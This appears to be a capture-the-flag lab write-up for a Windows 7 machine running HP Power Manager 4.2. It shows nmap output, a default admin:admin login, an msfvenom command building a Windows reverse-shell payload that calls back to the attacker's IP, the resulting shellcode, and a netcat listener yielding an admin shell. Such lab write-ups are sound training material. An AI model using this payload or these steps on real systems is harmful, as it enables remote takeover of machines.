# Kevin
### Enumeration
```
# Nmap 7.92 scan initiated Thu Apr 21 18:23:18 2022 as: nmap -sCV -v -oN tcp.out 192.168.219.45
Nmap scan report for ip-192-168-219-45.eu-west-1.compute.internal (192.168.219.45)
Host is up (0.015s latency).
Not shown: 989 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
80/tcp    open  http         GoAhead WebServer
| http-methods:
|_  Supported Methods: GET HEAD
| http-title: HP Power Manager
|_Requested resource was http://ip-192-168-219-45.eu-west-1.compute.internal/index.asp
|_http-server-header: GoAhead-Webs
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Ultimate N 7600 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped
| rdp-ntlm-info:
|   Target_Name: KEVIN
|   NetBIOS_Domain_Name: KEVIN
|   NetBIOS_Computer_Name: KEVIN
|   DNS_Domain_Name: kevin
|   DNS_Computer_Name: kevin
|   Product_Version: 6.1.7600
|_  System_Time: 2022-04-21T18:24:22+00:00
| ssl-cert: Subject: commonName=kevin
| Issuer: commonName=kevin
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2022-02-14T16:29:03
| Not valid after:  2022-08-16T16:29:03
| MD5:   f330 5b88 51f7 4175 c8cd 8918 a40a 7906
|_SHA-1: 1630 5bb9 34c7 59e1 b368 ac4e 00b9 78f6 6938 6c43
|_ssl-date: 2022-04-21T18:24:37+00:00; +1s from scanner time.
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: KEVIN; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   2.1:
|_    Message signing enabled but not required
| smb-os-discovery:
|   OS: Windows 7 Ultimate N 7600 (Windows 7 Ultimate N 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::-
|   Computer name: kevin
|   NetBIOS computer name: KEVIN\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-04-21T11:24:22-07:00
| nbstat: NetBIOS name: KEVIN, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:ba:70:82 (VMware)
| Names:
|   KEVIN<00>            Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   KEVIN<20>            Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|_  \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time:
|   date: 2022-04-21T18:24:22
|_  start_date: 2022-04-21T08:32:36
|_clock-skew: mean: 1h24m01s, deviation: 3h07m50s, median: 0s

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Apr 21 18:24:36 2022 -- 1 IP address (1 host up) scanned in 77.81 seconds
```

##### 80
Webserver running HP Power Manager. We could login with credentials `admin:admin` to find that the version running was 4.2. Searching for exploits, we find that there is a metasploit module that takes advantage of a buffer overflow. I also found [this](https://github.com/CountablyInfinite/HP-Power-Manager-Buffer-Overflow-Python3) exploit on GitHub, which is just a Python script. Ultimately, I used [this exploit-db exploit](https://www.exploit-db.com/exploits/10099). I generated a payload using `msfvenom`:

```shell
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.219 LPORT=80  -b '\x00\x1a\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5' --platform windows -f c
```

I tried with `-f python`, but this gave the output as a bytestring, which doesn't work for this exploit - the payload is placed into an HTTP request using a format specifier and there it needs to be encoded, evidently, as `latin1`. It's easier to use `-f c` and enclose in parentheses, such that Python will just concatenate everything together, i.e.:

```python
SHELL = (
"n00bn00b"
"\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
"\x99\x99\xf7\xe3\x83\xee\xfc\xe2\xf4\x65\x71\x75\xe3\x99\x99"
"\x97\x6a\x7c\xa8\x37\x87\x12\xc9\xc7\x68\xcb\x95\x7c\xb1\x8d"
"\x12\x85\xcb\x96\x2e\xbd\xc5\xa8\x66\x5b\xdf\xf8\xe5\xf5\xcf"
"\xb9\x58\x38\xee\x98\x5e\x15\x11\xcb\xce\x7c\xb1\x89\x12\xbd"
"\xdf\x12\xd5\xe6\x9b\x7a\xd1\xf6\x32\xc8\x12\xae\xc3\x98\x4a"
"\x7c\xaa\x81\x7a\xcd\xaa\x12\xad\x7c\xe2\x4f\xa8\x08\x4f\x58"
"\x56\xfa\xe2\x5e\xa1\x17\x96\x6f\x9a\x8a\x1b\xa2\xe4\xd3\x96"
"\x7d\xc1\x7c\xbb\xbd\x98\x24\x85\x12\x95\xbc\x68\xc1\x85\xf6"
"\x30\x12\x9d\x7c\xe2\x49\x10\xb3\xc7\xbd\xc2\xac\x82\xc0\xc3"
"\xa6\x1c\x79\xc6\xa8\xb9\x12\x8b\x1c\x6e\xc4\xf1\xc4\xd1\x99"
"\x99\x9f\x94\xea\xab\xa8\xb7\xf1\xd5\x80\xc5\x9e\x66\x22\x5b"
"\x09\x98\xf7\xe3\xb0\x5d\xa3\xb3\xf1\xb0\x77\x88\x99\x66\x22"
"\xb3\xc9\xc9\xa7\xa3\xc9\xd9\xa7\x8b\x73\x96\x28\x03\x66\x4c"
"\x60\x89\x9c\xf1\x37\x4b\xa8\x42\x9f\xe1\x99\x99\xa7\x6a\x7f"
"\xf3\xe7\xb5\xce\xf1\x6e\x46\xed\xf8\x08\x36\x1c\x59\x83\xef"
"\x66\xd7\xff\x96\x75\xf1\x07\x56\x3b\xcf\x08\x36\xf1\xfa\x9a"
"\x87\x99\x10\x14\xb4\xce\xce\xc6\x15\xf3\x8b\xae\xb5\x7b\x64"
"\x91\x24\xdd\xbd\xcb\xe2\x98\x14\xb3\xc7\x89\x5f\xf7\xa7\xcd"
"\xc9\xa1\xb5\xcf\xdf\xa1\xad\xcf\xcf\xa4\xb5\xf1\xe0\x3b\xdc"
"\x1f\x66\x22\x6a\x79\xd7\xa1\xa5\x66\xa9\x9f\xeb\x1e\x84\x97"
"\x1c\x4c\x22\x07\x56\x3b\xcf\x9f\x45\x0c\x24\x6a\x1c\x4c\xa5"
"\xf1\x9f\x93\x19\x0c\x03\xec\x9c\x4c\xa4\x8a\xeb\x98\x89\x99"
"\xca\x08\x36"
)
```

Running a netcat listener on 80 and then the exploit triggers a reverse shell as the admin, so we can just grab the root flag.